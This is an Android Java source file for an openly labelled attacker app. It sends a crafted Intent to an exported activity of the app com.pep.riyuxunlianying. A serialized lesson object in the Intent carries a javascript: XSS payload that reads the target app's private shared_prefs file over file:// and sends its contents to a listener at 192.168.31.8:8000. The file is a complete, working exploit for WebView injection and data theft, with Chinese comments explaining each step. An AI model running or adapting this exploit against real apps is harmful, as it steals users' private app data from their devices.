package com.example.attacker;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.pep.riyuxunlianying.bean.SessionKewen;
import com.pep.riyuxunlianying.bean.StudyJiaocai;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btn = findViewById(R.id.btn_launch);
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                launchAttack();
            }
        });
    }

    private void launchAttack() {
        try {
            // 目标组件
            ComponentName target = new ComponentName("com.pep.riyuxunlianying", "com.pep.riyuxunlianying.activity.SessionKewenActivity");
            
            Intent intent = new Intent();
            intent.setComponent(target);
            
            // 构造恶意 Payload (XSS -> File Theft)
            // 使用 javascript: 伪协议
            String jsCode = "var xhr=new XMLHttpRequest();" +
                            "xhr.open('GET','file:///data/data/com.pep.riyuxunlianying/shared_prefs/CobubRazor_SharedPref.xml',false);" +
                            "xhr.send(null);" +
                            "new Image().src='http://192.168.31.8:8000/?data='+encodeURIComponent(xhr.responseText);";
            
            String payload = "javascript:" + jsCode;

            // 构造序列化对象 SessionKewen
            SessionKewen sessionKewen = new SessionKewen();
            sessionKewen.classData = new ArrayList<>();
            
            SessionKewen.ClassData classData = new SessionKewen.ClassData();
            classData.contents = payload; // 注入 Payload 到 contents 字段
            // 填充其他字段防止空指针（虽然不一定用到）
            classData.id = "1";
            classData.title = "Exploit";
            
            sessionKewen.classData.add(classData);

            // 构造 StudyJiaocai.ClassSection (Activity 中也有这个字段)
            StudyJiaocai.ClassSection classSection = new StudyJiaocai.ClassSection();
            classSection.title = "Exploit Section";

            // 尝试多种 Key 传递序列化对象
            // 注意：putExtra 会根据对象类型自动选择 putExtra(String, Serializable)
            intent.putExtra("extra_session_kewen", sessionKewen);
            intent.putExtra("session_kewen", sessionKewen);
            intent.putExtra("kewen", sessionKewen);
            
            // 有些代码可能检查 List
            ArrayList<SessionKewen> list = new ArrayList<>();
            list.add(sessionKewen);
            intent.putExtra("list", list);
            intent.putExtra("data", list);
            
            // 原始猜测的 Key 也保留，万一它是 String 类型解析的（虽然之前的 crash 证明不是）
            // intent.putExtra("contents", payload); 
            
            startActivity(intent);
            Log.d("Attacker", "Attack Intent sent!");
            Toast.makeText(this, "Attack Sent!", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Attack Failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
}